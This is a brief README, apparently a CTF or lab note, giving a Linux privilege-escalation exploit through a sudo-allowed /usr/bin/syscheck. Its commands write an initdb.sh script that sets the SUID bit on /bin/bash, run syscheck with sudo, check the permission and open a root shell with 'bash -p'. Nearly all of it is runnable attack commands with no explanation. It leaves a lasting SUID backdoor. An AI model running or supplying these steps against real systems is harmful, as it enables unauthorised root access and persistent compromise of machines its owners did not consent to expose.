# sudo--l-usr-bin-syscheck

![image](https://github.com/user-attachments/assets/9e792474-cc87-4b29-9c28-24c4465442ad)

# Create the initdb.sh script that sets the SUID bit on /bin/bash
echo "chmod +s /bin/bash" > /path/to/initdb.sh
chmod +x /path/to/initdb.sh

# Run /usr/bin/syscheck with sudo privileges
sudo /usr/bin/syscheck

# Verify the SUID bit is set on /bin/bash
ls -ld /bin/bash

# Run /bin/bash with the -p option to get a root shell
/bin/bash -p

